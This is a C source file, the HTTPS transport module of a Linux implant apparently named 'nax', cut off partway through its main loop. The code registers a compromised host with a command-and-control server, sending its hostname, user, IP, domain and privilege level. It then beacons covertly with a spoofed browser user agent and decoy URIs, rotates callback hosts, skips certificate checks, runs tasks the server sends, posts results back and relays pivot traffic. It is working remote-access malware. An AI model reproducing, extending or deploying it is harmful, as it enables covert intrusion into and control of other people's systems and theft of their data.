/* nax_linux/src/Transport/https.c */

#ifdef NAX_HTTPS_MODE

#include "nax_linux.h"
#include "opsec.h"
#include "nax_bof_sdk.h"
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <poll.h>
#include <time.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>

#ifdef __has_include
#  if __has_include("nax_config.h")
#    include "nax_config.h"
#  endif
#endif

/* ===== compile-time defaults ===== */
#ifndef NAX_HTTP_URI_GET
#  define NAX_HTTP_URI_GET  "/news/feed"
#endif
#ifndef NAX_HTTP_URI_POST
#  define NAX_HTTP_URI_POST "/api/submit"
#endif
#ifndef NAX_HTTP_UA
#  define NAX_HTTP_UA       "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
#endif
#ifndef NAX_C2_PORT
#  define NAX_C2_PORT       443
#endif

/* ===== NaxSysInfo forward (defined in sysinfo.c) ===== */
typedef struct {
    char     hostname[256]; char     username[128];
    char     ip[64];        char     domain[64];
    char     procname[256]; char     imgpath[512];
    char     osver[64];
    uint32_t pid;  uint32_t tid; uint32_t ppid;
    uint32_t os_major; uint32_t os_minor; uint16_t os_build;
    uint8_t  elevated;
} NaxSysInfo;

/* ===== extern functions ===== */
extern int nax_encrypt(const uint8_t *key, const uint8_t *plain, uint32_t plain_len,
                        uint8_t *out, uint32_t *out_len);
extern int nax_decrypt(const uint8_t *key, const uint8_t *enc, uint32_t enc_len,
                        uint8_t *out, uint32_t *out_len);
extern int nax_build_result(uint32_t task_id, uint8_t status,
                             const uint8_t *data, uint32_t data_len,
                             uint8_t *frame, uint32_t *frame_len);
extern int nax_build_heartbeat(uint8_t *out, uint32_t *out_len);
extern int nax_frame_encode(uint8_t msg_type, const uint8_t *body, uint32_t body_len,
                             uint8_t *out, uint32_t *out_len);
extern int nax_frame_decode(const uint8_t *frame, uint32_t frame_len,
                             uint8_t *msg_type, uint8_t **body, uint32_t *body_len);
extern int nax_decode_task(const uint8_t *body, uint32_t body_len, NaxTask *t);
extern uint8_t nax_dispatch(NaxAgent *a, NaxTask *task,
                              uint8_t **result, uint32_t *result_len);
extern void nax_process_tunnels(NaxAgent *a);
extern uint32_t nax_process_tunnels_ex(NaxAgent *a, uint8_t *out, uint32_t out_cap);
extern int nax_build_reg_body(
    const char *hn, uint32_t hn_len, const char *un, uint32_t un_len,
    uint8_t arch, uint32_t pid, uint32_t sleep_ms, uint32_t tid,
    const char *ip, uint32_t ip_len, const char *dom, uint32_t dom_len,
    const char *proc, uint32_t proc_len, uint8_t elevated,
    uint32_t os_major, uint32_t os_minor, uint16_t os_build,
    uint32_t parent_pid, uint32_t acp, uint32_t oem_cp,
    const char *img, uint32_t img_len,
    uint8_t *out, uint32_t *out_len);
extern void nax_gather_sysinfo(NaxSysInfo *info);

/* ===== profile functions (https_profile.c) ===== */
extern void        nax_apply_profile(const uint8_t *data, uint32_t data_len);
extern const char *nax_profile_beacon_hdr(void);
extern const char *nax_profile_get_uri(void);
extern const char *nax_profile_post_uri(void);
extern int         nax_profile_loaded(void);
extern int         nax_is_empty_resp(const uint8_t *data, uint32_t data_len);
extern uint8_t     nax_profile_rotation(void);         /* 0=sequential, 1=random */
extern const char *nax_profile_get_uri_rotate(void);   /* rotate GET URI index */
extern const char *nax_profile_post_uri_rotate(void);  /* rotate POST URI index */
extern uint8_t     nax_profile_callbacks_count(void);
extern int         nax_profile_callback_host(uint8_t idx, char *host, uint16_t *port);
/* Encode body according to profile ClientMeta/ClientOutput config.
 * Returns encoded length, 0 on error. out_buf must be large enough. */
extern uint32_t    nax_encode_get_meta(const uint8_t *body, uint32_t body_len,
                                          char *out_buf, uint32_t out_cap);
extern uint32_t    nax_encode_post_meta(const uint8_t *body, uint32_t body_len,
                                         char *out_buf, uint32_t out_cap);
extern uint32_t    nax_encode_post_output(const uint8_t *body, uint32_t body_len,
                                           char *out_buf, uint32_t out_cap);
/* Returns extra HTTP headers string (beacon_id + custom headers + meta placement).
 * cookie/header placement for ClientMeta is included here.
 * meta_enc / meta_enc_len: the already-encoded ClientMeta value. */
extern uint32_t    nax_build_request_headers(const char *sid,
                                              const char *meta_enc, uint32_t meta_enc_len,
                                              int is_get,
                                              char *hdr_buf, uint32_t hdr_cap);
/* Decode server output (strip prepend/append, base64 decode, unmask).
 * Returns decoded length, 0 on error. */
extern uint32_t    nax_decode_server_output(const uint8_t *enc, uint32_t enc_len,
                                             int is_get,
                                             uint8_t *out, uint32_t out_cap);
/* NaxSysInfo defined above */

/* ===== TLS state ===== */
static SSL_CTX *g_ssl_ctx = NULL;
static SSL     *g_ssl     = NULL;
static int      g_sock    = -1;
static pthread_mutex_t g_https_mutex = PTHREAD_MUTEX_INITIALIZER;

/* ===== session ID (identical to tcp.c) ===== */
static void gen_session_id(char *out)
{
    uint8_t raw[8] = {0};
    char hostname[64] = {0};
    gethostname(hostname, sizeof(hostname) - 1);
    for (size_t i = 0; i < strlen(hostname) && i < 8; i++)
        raw[i] ^= (uint8_t)hostname[i];
    {
        struct ifreq ifr; struct ifconf ifc; char buf[1024];
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock >= 0) {
            ifc.ifc_len = sizeof(buf); ifc.ifc_buf = buf;
            if (ioctl(sock, SIOCGIFCONF, &ifc) == 0) {
                struct ifreq *it  = ifc.ifc_req;
                struct ifreq *end = it + (ifc.ifc_len / sizeof(*it));
                for (; it != end; ++it) {
                    strncpy(ifr.ifr_name, it->ifr_name, IFNAMSIZ - 1);
                    if (ioctl(sock, SIOCGIFFLAGS, &ifr) != 0) continue;
                    if (ifr.ifr_flags & IFF_LOOPBACK)  continue;
                    if (!(ifr.ifr_flags & IFF_UP))      continue;
                    if (ioctl(sock, SIOCGIFHWADDR, &ifr) != 0) continue;
                    uint8_t *mac = (uint8_t *)ifr.ifr_hwaddr.sa_data;
                    for (int i = 0; i < 6 && i < 8; i++) raw[i] ^= mac[i];
                    break;
                }
            }
            close(sock);
        }
    }
    int all_zero = 1;
    for (int i = 0; i < 8; i++) if (raw[i]) { all_zero = 0; break; }
    if (all_zero) {
        FILE *f = fopen("/dev/urandom", "rb");
        if (f) { fread(raw, 1, 8, f); fclose(f); }
    }
    raw[4] ^= (uint8_t)(getpid() & 0xFF);
    raw[5] ^= (uint8_t)((getpid() >> 8) & 0xFF);
    raw[6] ^= 0xC0;
    raw[7] ^= (uint8_t)(NAX_C2_PORT & 0xFF);
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < 8; i++) {
        out[i*2]   = hex[(raw[i] >> 4) & 0xF];
        out[i*2+1] = hex[raw[i] & 0xF];
    }
    out[16] = '\0';
}

/* ===== low-level TLS I/O ===== */
static int tls_write_all(const void *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int r = SSL_write(g_ssl, (const char *)buf + sent, len - sent);
        if (r <= 0) return -1;
        sent += r;
    }
    return 0;
}
static int tls_read_line(char *buf, int max) {
    int n = 0;
    while (n < max - 1) {
        char c;
        if (SSL_read(g_ssl, &c, 1) <= 0) return -1;
        buf[n++] = c;
        if (c == '\n') break;
    }
    buf[n] = '\0';
    return n;
}
static void tls_drain(int len) __attribute__((unused)); static void tls_drain(int len) {
    char tmp[512];
    while (len > 0) {
        int chunk = len < (int)sizeof(tmp) ? len : (int)sizeof(tmp);
        int r = SSL_read(g_ssl, tmp, chunk);
        if (r <= 0) break;
        len -= r;
    }
}
static uint8_t *tls_read_body(int len, uint32_t *out_len) {
    if (len <= 0) return NULL;
    uint8_t *buf = (uint8_t *)malloc((size_t)len);
    if (!buf) return NULL;
    int got = 0;
    while (got < len) {
        int r = SSL_read(g_ssl, buf + got, len - got);
        if (r <= 0) { free(buf); return NULL; }
        got += r;
    }
    *out_len = (uint32_t)len;
    return buf;
}
static int read_http_headers(void) {
    char line[512];
    /* Read status line */
    if (tls_read_line(line, sizeof(line)) < 0) return -1;
    int status = 0;
    int chunked = 0;
    if (strncmp(line, "HTTP/", 5) == 0) {
        char *sp = strchr(line, ' ');
        if (sp) status = atoi(sp + 1);
    }
    int clen = 0;
    for (;;) {
        if (tls_read_line(line, sizeof(line)) < 0) break;
        if (line[0] == '\r' || line[0] == '\n') break;
        if (strncasecmp(line, "Content-Length:", 15) == 0)
            clen = atoi(line + 15);
        if (strncasecmp(line, "Transfer-Encoding:", 18) == 0 &&
            strstr(line, "chunked"))
            chunked = 1;
    }
    if (status != 200 && status != 0) {
        tls_drain(clen);
        return -1;
    }
    /* Handle chunked transfer encoding: read first chunk size */
    if (chunked) {
        char sz_line[64];
        if (tls_read_line(sz_line, sizeof(sz_line)) < 0) return -1;
        clen = (int)strtol(sz_line, NULL, 16);
    }
    return clen;
}

/* ===== TLS connect ===== */
/* Current active callback host (rotates on failure) */
static uint8_t  g_host_idx    = 0;
static char     g_cur_host[256] = {0};
static uint16_t g_cur_port    = 0;

/* Pre-profile compiled-in callback hosts from nax_config.h */
#ifdef NAX_CB_HOST_COUNT
static void nax_get_compiled_host(uint8_t idx, char *host, uint16_t *port) {
    /* Macros write the host string and port bytes into provided buffers */
    uint8_t port_buf[2] = {0};
    switch (idx) {
#  ifdef NAX_CB_HOST_0_WRITE
    case 0: { volatile char *h=(volatile char*)host; NAX_CB_HOST_0_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_0_WRITE(p); } break;
#  endif
#  ifdef NAX_CB_HOST_1_WRITE
    case 1: { volatile char *h=(volatile char*)host; NAX_CB_HOST_1_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_1_WRITE(p); } break;
#  endif
#  ifdef NAX_CB_HOST_2_WRITE
    case 2: { volatile char *h=(volatile char*)host; NAX_CB_HOST_2_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_2_WRITE(p); } break;
#  endif
#  ifdef NAX_CB_HOST_3_WRITE
    case 3: { volatile char *h=(volatile char*)host; NAX_CB_HOST_3_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_3_WRITE(p); } break;
#  endif
#  ifdef NAX_CB_HOST_4_WRITE
    case 4: { volatile char *h=(volatile char*)host; NAX_CB_HOST_4_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_4_WRITE(p); } break;
#  endif
#  ifdef NAX_CB_HOST_5_WRITE
    case 5: { volatile char *h=(volatile char*)host; NAX_CB_HOST_5_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_5_WRITE(p); } break;
#  endif
#  ifdef NAX_CB_HOST_6_WRITE
    case 6: { volatile char *h=(volatile char*)host; NAX_CB_HOST_6_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_6_WRITE(p); } break;
#  endif
#  ifdef NAX_CB_HOST_7_WRITE
    case 7: { volatile char *h=(volatile char*)host; NAX_CB_HOST_7_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_7_WRITE(p); } break;
#  endif
    default: break;
    }
    *port = (uint16_t)port_buf[0] | ((uint16_t)port_buf[1] << 8);
}
#endif /* NAX_CB_HOST_COUNT */

static void https_rotate_host(NaxAgent *a) {
    /* Post-profile: use hosts from parsed profile */
    uint8_t count = nax_profile_callbacks_count();
    if (count > 0) {
        uint8_t rotation = nax_profile_rotation();
        if (rotation == 1) {
            FILE *f = fopen("/dev/urandom","rb");
            uint8_t r = 0;
            if (f) { fread(&r, 1, 1, f); fclose(f); }
            g_host_idx = r % count;
        }
        char host[256] = {0}; uint16_t port = 0;
        if (nax_profile_callback_host(g_host_idx, host, &port) == 0) {
            strncpy(g_cur_host, host, sizeof(g_cur_host)-1);
            g_cur_port = port;
        }
        if (rotation != 1)
            g_host_idx = (g_host_idx + 1) % count;
        return;
    }

    /* Pre-profile: use compiled-in hosts from nax_config.h */
#ifdef NAX_CB_HOST_COUNT
    uint8_t cb_count = NAX_CB_HOST_COUNT;
    if (cb_count > 0) {
        char host[256] = {0}; uint16_t port = 0;
        nax_get_compiled_host(g_host_idx, host, &port);
        if (host[0]) {
            strncpy(g_cur_host, host, sizeof(g_cur_host)-1);
            g_cur_port = port;
        }
        g_host_idx = (g_host_idx + 1) % cb_count;
        return;
    }
#endif
    /* Fallback: single compiled-in host */
    strncpy(g_cur_host, a->cfg.c2_host, sizeof(g_cur_host)-1);
    g_cur_port = (uint16_t)a->cfg.c2_port;
}

static int https_tls_connect(NaxAgent *a)
{
    /* Use current rotated host */
    const char *host = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
    uint16_t    port = g_cur_port    ? g_cur_port  : (uint16_t)a->cfg.c2_port;

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", (unsigned)port);

    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags    = AI_NUMERICHOST;
    if (getaddrinfo(host, port_str, &hints, &res) != 0) {
        return -1;
    }
    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) { freeaddrinfo(res); return -1; }
    struct timeval tv = {5, 0};
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        close(sock); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);
    if (!g_ssl_ctx) {
        g_ssl_ctx = SSL_CTX_new(TLS_client_method());
        if (!g_ssl_ctx) { close(sock); return -1; }
        SSL_CTX_set_verify(g_ssl_ctx, SSL_VERIFY_NONE, NULL);
    }
    if (g_ssl) { SSL_free(g_ssl); g_ssl = NULL; }
    g_ssl = SSL_new(g_ssl_ctx);
    if (!g_ssl) { close(sock); return -1; }
    SSL_set_fd(g_ssl, sock);
    if (SSL_connect(g_ssl) != 1) {
        SSL_free(g_ssl); g_ssl = NULL; close(sock); return -1;
    }
    g_sock = sock;
    return 0;
}
static void https_cleanup(void) {
    if (g_ssl) { SSL_shutdown(g_ssl); SSL_free(g_ssl); g_ssl = NULL; }
    if (g_sock >= 0) { close(g_sock); g_sock = -1; }
}

/* ===== HTTP POST (pre-profile and post-profile) ===== */
/* profile_loaded: 0 = pre-profile (beacon ID in X-Beacon-Id, body raw)
 *                 1 = post-profile (use PostClientMeta / PostClientOutput) */
static uint8_t *https_post(NaxAgent *a,
                             const uint8_t *body, uint32_t body_len,
                             int profile_active,
                             uint32_t *out_resp_len)
{
    /* Encode body per PostClientOutput (only when profile active) */
    uint8_t *send_body = (uint8_t *)body;
    uint32_t send_len  = body_len;
    uint8_t *enc_body  = NULL;

    if (profile_active) {
        /* worst case: mask(+4) + hex_encode(*2) + prepend/append (1KB margin) */
        uint32_t enc_cap = (body_len + 4) * 2 + 1024;
        enc_body = (uint8_t *)malloc(enc_cap);
        if (enc_body) {
            uint32_t enc_len = nax_encode_post_output(body, body_len,
                                                        (char *)enc_body, enc_cap);
            if (enc_len > 0) { send_body = enc_body; send_len = enc_len; }
        }
    }

    /* Encode ClientMeta (session ID) for POST header — uses post_client_META config */
    char meta_enc[2048] = {0};
    uint32_t meta_len = 0;
    if (profile_active) {
        meta_len = nax_encode_post_meta((const uint8_t *)a->session_id,
                                         (uint32_t)strlen(a->session_id),
                                         meta_enc, sizeof(meta_enc));
    }

    /* Build request headers */
    char hdrs[4096];
    uint32_t hdr_len;
    if (profile_active) {
        hdr_len = nax_build_request_headers(a->session_id,
                                             meta_enc, meta_len,
                                             0 /*POST*/, hdrs, sizeof(hdrs));
    } else {
        /* Pre-profile: beacon ID in X-Beacon-Id, Content-Type, X-NaX-Public */
        hdr_len = (uint32_t)snprintf(hdrs, sizeof(hdrs),
            "X-Beacon-Id: %s\r\n"
            "Content-Type: application/octet-stream\r\n"
            "X-NaX-Public: 1\r\n"
            "Content-Length: %u\r\n",
            a->session_id, send_len);
    }

    const char *uri = profile_active ? nax_profile_post_uri_rotate() : NAX_HTTP_URI_POST;
    const char *req_host = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
    char req[512];
    int req_len = snprintf(req, sizeof(req),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: " NAX_HTTP_UA "\r\n",
        uri, req_host);

    /* Content-Length header — required for POST body, not added by nax_build_request_headers */
    char clen_hdr[64];
    int clen_hdr_len = snprintf(clen_hdr, sizeof(clen_hdr),
        "Content-Length: %u\r\n", send_len);

    pthread_mutex_lock(&g_https_mutex);
    uint8_t *resp = NULL;
    if (tls_write_all(req, req_len) == 0 &&
        tls_write_all(hdrs, (int)hdr_len) == 0 &&
        tls_write_all(clen_hdr, clen_hdr_len) == 0 &&
        tls_write_all("\r\n", 2) == 0 &&
        tls_write_all(send_body, (int)send_len) == 0) {
        int clen = read_http_headers();
        resp = tls_read_body(clen, out_resp_len);
    }
    pthread_mutex_unlock(&g_https_mutex);

    if (enc_body) free(enc_body);

    /* Decode server output if profile active */
    if (resp && *out_resp_len > 0 && profile_active) {
        uint8_t *dec = (uint8_t *)malloc(*out_resp_len + 256);
        if (dec) {
            uint32_t dec_len = nax_decode_server_output(resp, *out_resp_len,
                                                          0 /*POST*/, dec, *out_resp_len + 256);
            if (dec_len > 0) {
                free(resp); resp = dec; *out_resp_len = dec_len;
            } else {
                free(dec);
            }
        }
    }
    return resp;
}

/* ===== HTTP GET (heartbeat with profile) ===== */
static uint8_t *https_get(NaxAgent *a,
                            const uint8_t *hb_enc, uint32_t hb_enc_len,
                            uint32_t *out_resp_len)
{
    /* Encode encrypted heartbeat per GetClientMeta */
    char meta_enc[4096] = {0};
    uint32_t meta_len = nax_encode_get_meta(hb_enc, hb_enc_len,
                                              meta_enc, sizeof(meta_enc));

    /* Build request headers */
    char hdrs[4096];
    uint32_t hdr_len = nax_build_request_headers(a->session_id,
                                                   meta_enc, meta_len,
                                                   1 /*GET*/, hdrs, sizeof(hdrs));

    const char *uri = nax_profile_get_uri_rotate();
    const char *host = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
    char req[512];
    int req_len = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: " NAX_HTTP_UA "\r\n",
        uri, host);

    pthread_mutex_lock(&g_https_mutex);
    uint8_t *resp = NULL;
    int _get_ok = (tls_write_all(req, req_len) == 0 &&
                   tls_write_all(hdrs, (int)hdr_len) == 0 &&
                   tls_write_all("Connection: keep-alive\r\n\r\n", 26) == 0);
    if (_get_ok) {
        int clen = read_http_headers();
        if (clen >= 0) {
            resp = tls_read_body(clen, out_resp_len);
        } else {
            *out_resp_len = UINT32_MAX; /* network/HTTP error sentinel */
        }
    } else {
        *out_resp_len = UINT32_MAX; /* write failed */
    }
    pthread_mutex_unlock(&g_https_mutex);

    /* Decode server output (base64url → raw AES-CBC) */
    if (resp && *out_resp_len > 0) {

        /* Check if this is the EmptyResp (no tasks) — sent verbatim by server,
         * NOT AES-encrypted. If so, return 0 bytes so caller treats it as NO_TASKS */
        if (nax_is_empty_resp(resp, *out_resp_len)) {
            free(resp);
            *out_resp_len = 0;
            return NULL;
        }

        uint8_t *dec = (uint8_t *)malloc(*out_resp_len + 256);
        if (dec) {
            uint32_t dec_len = nax_decode_server_output(resp, *out_resp_len,
                                                          1 /*GET*/, dec, *out_resp_len + 256);
            if (dec_len > 0) {
                free(resp); resp = dec; *out_resp_len = dec_len;
            } else {
                free(dec);
            }
        }
    }
    return resp;
}

/* ===== encrypt frame and POST as result ===== */
static int https_send_result(NaxAgent *a, uint32_t task_id, uint8_t status,
                              const uint8_t *data, uint32_t data_len)
{
    uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
    if (!frame) return -1;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_build_result(task_id, status, data, data_len, frame, &frame_len) < 0) {
        free(frame); return -1;
    }
    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
    uint8_t *enc = (uint8_t *)malloc(enc_cap);
    if (!enc) { free(frame); return -1; }
    uint32_t enc_len = enc_cap;
    int rc = 0;
    if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) < 0) {
        rc = -1;
    } else {
        uint32_t resp_len = 0;
        uint8_t *resp = https_post(a, enc, enc_len, nax_profile_loaded(), &resp_len);
        if (!resp) rc = -1;
        else free(resp);
    }
    free(frame); free(enc);
    return rc;
}

/* ===== nax_send_tunnel_result (used by tunnel.c) ===== */
int nax_send_tunnel_result(NaxAgent *a, const uint8_t *data, uint32_t data_len)
{
    return https_send_result(a, 0, NAX_STATUS_TUNNEL, data, data_len);
}

/* ===== process decrypted response frames ===== */
static int https_handle_frames(NaxAgent *a, const uint8_t *enc, uint32_t enc_len)
{
    int tasks_dispatched = 0;
    uint8_t *plain = (uint8_t *)malloc(enc_len + NAX_AES_BLOCK);
    if (!plain) return 0;
    uint32_t plain_len = enc_len + NAX_AES_BLOCK;
    if (nax_decrypt(a->cfg.aes_key, enc, enc_len, plain, &plain_len) < 0) {
        free(plain); return 0;
    }
    uint8_t *cur = plain; uint32_t rem = plain_len;
    while (rem >= NAX_FRAME_HDR) {
        uint8_t ft = 0; uint8_t *fb = NULL; uint32_t fbl = 0;
        if (nax_frame_decode(cur, rem, &ft, &fb, &fbl) < 0) break;
        uint32_t step = NAX_FRAME_HDR + fbl;
        if (step > rem) break;
        cur += step; rem -= step;

        if (ft == NAX_WIRE_PROFILE && fbl > 0) {
            nax_apply_profile(fb, fbl);
            continue;
        }
        if (ft == NAX_WIRE_NO_TASKS) {
            break;
        }
        if (ft != NAX_WIRE_TASK) {
            continue;
        }
        tasks_dispatched++;

        NaxTask task;
        if (nax_decode_task(fb, fbl, &task) < 0) {
            DBG_ERR("nax_decode_task failed for frame body_len=%u", fbl);
            continue;
        }

        extern const char *nax_cmd_name(uint8_t);
        DBG("→ task received: cmd=0x%02x (%s) task_id=%u args_len=%u",
            task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id, task.args_len);

        uint8_t *result = NULL; uint32_t result_len = 0;
        int was_profile_update = (task.cmd_id == NAX_CMD_PROFILE_UPDATE);

        uint8_t status = nax_dispatch(a, &task, &result, &result_len);

        if (status == NAX_STATUS_OK)
            DBG_OK("cmd=0x%02x (%s) task_id=%u → OK result_len=%u",
                   task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id, result_len);
        else if (status == NAX_STATUS_ASYNC)
            DBG("cmd=0x%02x (%s) task_id=%u → ASYNC (background)",
                task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id);
        else
            DBG_ERR("cmd=0x%02x (%s) task_id=%u → ERR status=0x%02x result_len=%u",
                    task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id, status, result_len);

        if (status != NAX_STATUS_ASYNC) {
            DBG("sending POST result task_id=%u status=0x%02x result_len=%u",
                task.task_id, status, result_len);
            https_send_result(a, task.task_id, status, result, result_len);
            DBG_OK("POST result sent for task_id=%u", task.task_id);
        }
        if (result) free(result);

        /* Apply deferred profile AFTER result is sent with old encoding */
        if (was_profile_update && a->pending_profile_data) {
            DBG("applying deferred profile (%u bytes) after result POST", a->pending_profile_len);
            nax_apply_profile(a->pending_profile_data, a->pending_profile_len);
            free(a->pending_profile_data);
            a->pending_profile_data = NULL;
            a->pending_profile_len  = 0;
            a->profile_pending = 1;
            DBG_OK("new profile active — next heartbeat will use new encoding/URIs");
        }
    }
    free(plain);
    return tasks_dispatched;
}

/* ===== process_pivots — relay child pivot data to C2 via HTTPS POST =====
 * Identical logic to tcp.c process_pivots but uses https_send_result.
 * Called in the beacon loop alongside nax_process_tunnels. */
static int process_pivots(NaxAgent *a)
{
    int relayed = 0;
    NaxPivot **pp = &a->pivot_head;
    while (*pp) {
        NaxPivot *p = *pp;
        int broken = 0;

        struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
        while (1) {
            int pr = poll(&pfd, 1, 0);
            if (pr <= 0) break;
            if (!(pfd.revents & POLLIN)) break;

            /* Read length-prefixed message from child beacon */
            uint8_t lenbuf[4]; ssize_t got = 0;
            while (got < 4) {
                ssize_t r = recv(p->sock, lenbuf + got, 4 - got, 0);
                if (r <= 0) { broken = 1; break; }
                got += r;
            }
            if (broken) break;

            uint32_t msg_len = (uint32_t)lenbuf[0] | ((uint32_t)lenbuf[1] << 8) |
                               ((uint32_t)lenbuf[2] << 16) | ((uint32_t)lenbuf[3] << 24);
            if (msg_len == 0 || msg_len > 4 * 1024 * 1024) { broken = 1; break; }

            uint8_t *msg = (uint8_t *)malloc(msg_len);
            if (!msg) { broken = 1; break; }
            got = 0;
            while ((uint32_t)got < msg_len) {
                ssize_t r = recv(p->sock, msg + got, msg_len - (uint32_t)got, 0);
                if (r <= 0) { free(msg); broken = 1; break; }
                got += r;
            }
            if (broken) break;

            /* Pack: [PIV_TYPE_DATA(1)][pivot_id(4LE)][msg_len(4LE)][msg] */
            uint32_t rd_len = 1 + 4 + 4 + msg_len;
            uint8_t *rd = (uint8_t *)malloc(rd_len);
            if (rd) {
                rd[0] = NAX_PIV_TYPE_DATA;
                rd[1] = (uint8_t)(p->pivot_id);       rd[2] = (uint8_t)(p->pivot_id >> 8);
                rd[3] = (uint8_t)(p->pivot_id >> 16); rd[4] = (uint8_t)(p->pivot_id >> 24);
                rd[5] = (uint8_t)(msg_len);            rd[6] = (uint8_t)(msg_len >> 8);
                rd[7] = (uint8_t)(msg_len >> 16);      rd[8] = (uint8_t)(msg_len >> 24);
                memcpy(rd + 9, msg, msg_len);
                if (https_send_result(a, 0, NAX_STATUS_OK, rd, rd_len) == 0)
                    relayed += (int)rd_len;
                free(rd);
            }
            free(msg);
        }

        if (broken) {
            /* Child disconnected — notify C2 */
            uint8_t unlink_data[6];
            unlink_data[0] = NAX_PIV_TYPE_UNLINK;
            unlink_data[1] = (uint8_t)(p->pivot_id);       unlink_data[2] = (uint8_t)(p->pivot_id >> 8);
            unlink_data[3] = (uint8_t)(p->pivot_id >> 16); unlink_data[4] = (uint8_t)(p->pivot_id >> 24);
            unlink_data[5] = 2; /* NAX_PIVOT_TYPE_TCP */
            https_send_result(a, 0, NAX_STATUS_OK, unlink_data, sizeof(unlink_data));
            close(p->sock);
            *pp = p->next;
            free(p);
        } else {
            pp = &p->next;
        }
    }
    return relayed;
}

static void https_async_cb(uint32_t task_id, uint8_t status,
                            const char *output, uint32_t output_len,
                            void *user_data) {
    NaxAgent *a = (NaxAgent *)user_data;
    https_send_result(a, task_id, status, (uint8_t *)output, output_len);
}

static void nax_https_drain_async(NaxAgent *a) {
    nax_async_drain(https_async_cb, a);
}

void nax_https_main(NaxAgent *a)
{
    signal(SIGPIPE, SIG_IGN);
    gen_session_id(a->session_id);
    nax_bof_sdk_init();

    NaxSysInfo info;
    nax_gather_sysinfo(&info);

    while (a->running) {
        /* Connect */
        https_rotate_host(a);
        while (a->running && https_tls_connect(a) < 0) {
            sleep(3);
            https_rotate_host(a);
        }
        if (!a->running) break;

        int registered = 0;
        while (a->running && !registered) {
            /* Build REGISTER frame */
            uint8_t reg_body[4096]; uint32_t reg_body_len = sizeof(reg_body);
            if (nax_build_reg_body(
                    info.hostname, strlen(info.hostname),
                    info.username, strlen(info.username),
                    NAX_ARCH_CURRENT, info.pid, a->cfg.sleep_ms, info.tid,
                    info.ip, strlen(info.ip), info.domain, strlen(info.domain),
                    info.procname, strlen(info.procname), info.elevated,
                    info.os_major, info.os_minor, info.os_build,
                    info.ppid, 0, 0, info.imgpath, strlen(info.imgpath),
                    reg_body, &reg_body_len) < 0) continue;

            uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
            if (!frame) continue;
            uint32_t frame_len = NAX_IO_CAP;
            if (nax_frame_encode(NAX_WIRE_REGISTER, reg_body, reg_body_len,
                                 frame, &frame_len) < 0) { free(frame); continue; }

            uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
            uint8_t *enc = (uint8_t *)malloc(enc_cap);
            if (!enc) { free(frame); continue; }
            uint32_t enc_len = enc_cap;
            if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) < 0) {
                free(frame); free(enc); continue;
            }
            free(frame);

            uint32_t resp_len = 0;
            DBG_SEC("REGISTER");
            DBG("sending REGISTER (pre-profile) to %s", a->cfg.c2_host);
            uint8_t *resp = https_post(a, enc, enc_len, 0 /*pre-profile*/, &resp_len);
            free(enc);

            if (!resp || resp_len == 0) {
                DBG_ERR("REGISTER failed — no response (resp=%p resp_len=%u)", (void*)resp, resp_len);
                if (resp) free(resp);
                sleep(3);
                continue;
            }
            DBG("REGISTER response: %u bytes", resp_len);

            /* Decrypt PROFILE response (raw AES-CBC, no ServerOutput decode
             * because we sent pre-profile) */
            uint8_t *plain = (uint8_t *)malloc(resp_len + NAX_AES_BLOCK);
            if (!plain) { free(resp); continue; }
            uint32_t plain_len = resp_len + NAX_AES_BLOCK;
            if (nax_decrypt(a->cfg.aes_key, resp, resp_len, plain, &plain_len) < 0) {
                free(resp); free(plain);
                sleep(3);
                continue;
            }
            free(resp);

            uint8_t ft = 0; uint8_t *fb = NULL; uint32_t fbl = 0;
            if (nax_frame_decode(plain, plain_len, &ft, &fb, &fbl) < 0) {
                free(plain); sleep(3); continue;
            }

            if (ft == NAX_WIRE_PROFILE) {
                DBG_OK("REGISTER response: got PROFILE frame (%u bytes) — profile applied", fbl);
